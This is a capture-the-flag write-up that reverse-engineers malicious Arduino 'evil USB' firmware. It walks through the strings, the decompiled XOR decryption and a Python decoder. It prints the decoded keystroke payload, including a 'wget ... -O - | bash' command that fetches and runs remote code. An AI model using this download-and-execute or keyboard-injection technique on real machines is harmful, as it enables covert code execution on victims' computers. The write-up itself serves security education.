# 18 - Evil USB

## Description

Level: Hard<br/>
Author: coderion

An engineer at SantaSecCorp has found a suspicious device stuck in the USB port of his computer. It doesn't seem to work
anymore, but we managed to dump the firmware for you. Please help us find out what the device did to their computer.

## Solution

We are given [a ZIP file](evil-usb.zip) that contains a ELF binary as well as a hex code file. This combination hints at
an Arduino executable, usually provided as a hex file. Taking a look at the strings, we can see this:

```
Arduino LLC
Arduino Leonardo
Scheduled activation in 
 hours
Running payload... Never gonna give you up btw
base64 -d data > data_decoded
bash data_decoded
GCC: (GNU) 7.3.0
atmega32u4
_Z12PluggableUSBv
_ZGVZ12PluggableUSBvE3obj
_ZZ12PluggableUSBvE3obj
micros
delay
_ZN9Keyboard_10sendReportEP9KeyReport.constprop.8
_ZN7Serial_5writeEPKhj
_ZL12_usbLineInfo
Serial
KeyboardLayout_de_DE
Keyboard
timer0_millis
timer0_fract
```

This is indeed a binary for the Arduino Leonardo. We can also see some constants hinting at some kind of Base64 encoded
data being sent over a serial / usb keyboard connection. There also seems to be an activation that runs after a fixed
time delay in hours. Next, I took a look in Ghidra to figure out how the payload is constructed:

```c
    // the delay calculation based on the current time
    delay();
    cVar9 = (char)R13R12 + -1;
    R13R12._1_1_ = R13R12._1_1_ - (R1 + ((char)R13R12 == '\0'));
    R13R12 = CONCAT11(R13R12._1_1_,cVar9);
    if (cVar9 == '\0' && R13R12._1_1_ == '\0') {
      R25R24 = Serial;
      *(undefined3 *)(iVar7 + -2) = 0x723;
      Print::println(R25R24);
      R25R24._0_1_ = (String)0xd8;
      
      // Get data from 0x119
      Z = (String *)&DAT_mem_0119;
      X = (String *)CONCAT11(Y._1_1_ - (((byte)Y < 0x27) + -1),(byte)Y - 0x27);
      do {
        *X = *Z;
        
        Z++;
        X++;
      } while (Z != 0x0);
      
      Z = (String *)CONCAT11(Y._1_1_ - (((byte)Y < 0x27) + -1),(byte)Y - 0x27);
      X = R17R16;
      
      R19R18._0_1_ = (byte)Y + 0xb1;
      R19R18._1_1_ = Y._1_1_ - (((byte)Y < 0x4f) + -2);
      
      // XOR decryption
      do {
        pbVar6 = Z;
        pSVar4 = X;
        *X =  *Z ^ 0x69;
        Z++;
        X++
      } while (Z != R19R18 || Z._1_1_ != (char)(R19R18._1_1_ + ((Z < R19R18)));
```

We can see that after the delay something is XOR decrypted and the key is simply `0x69`. Perfect, we can just take the
whole `data` section and XOR it with `0x69` and the Base64 encoded payload should be somewhere in there:

```python
encrypted = bytes.fromhex(
    'ffffffff00e100000000000000c180810000000000460380000c0a0106490d5b0d050d2a2b060d213b1e0a13061f255b0d190a5a381c335b055908213f000d3127050a04271f0b073b050b07381c305b501d255b0d19303e5c1b0b213f0725133302303d3013303d285a272e3c5b27032302262d3010243e3811245b3304275b2f0430130a59332e3c11255a23010d10515833033058262d0210263d2301273e24113303245a272d2702272e381e3303301024042705262d2305262d285c262e2f01242d245d255b011f0b3e3f5a0b5a231b25073b5d0d2a281d3d10281d20211e0e30042f13082806544957490d081d080000000098048204b904ae040005be04dc0400000000c301fb02c002e6010000000046051a05020601060d0a005363686564756c65642061637469766174696f6e20696e200020686f7572730052756e6e696e67207061796c6f61642e2e2e204e6576657220676f6e6e61206769766520796f752075702062747700626173653634202d642064617461203e20646174615f6465636f646564006261736820646174615f6465636f6465640000')

for e in encrypted:
    print(chr(e ^ 0x69), end='')
```

And as expected, there's the payload:

```shell
echo d2dldCBodHRwczovL2dpc3QuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2dpYW5rbHVnLzZkYTYzYTA3NGU2NjJkODYyMWQxM2ZmN2FmYzc0ZGUxL3Jhdy81ZjY1ODkyOTJhNWMxZjM3NDNkNGQwZjYyMmNlODJlODA5OGFhMDM4L2hvbWV3b3JrLnR4dCAtTyAtIHwgYmFzaAo= > data
```

Base64 decoding it:

```shell
wget https://gist.githubusercontent.com/gianklug/6da63a074e662d8621d13ff7afc74de1/raw/5f6589292a5c1f3743d4d0f622ce82e8098aa038/homework.txt -O - | bash
```

Visiting the link leads to one more shell script:

```shell
#!/bin/bash
wget https://gist.githubusercontent.com/gianklug/5e8756afc93211b15fe995f469add994/raw/5d5b86307181309c4bbbe021c94d75b9e07e6f8c/gistfile1.txt -O - | base64 -d > cat.png
```

The next (and final) URL contained [cat.png](cat.png), a beautiful picture of a cat. Running `strings` on that file
gives us the flag `HV23{4dru1n0_1s_fun}`. This was a fun challenge with quite a few obfuscation steps at the end. 
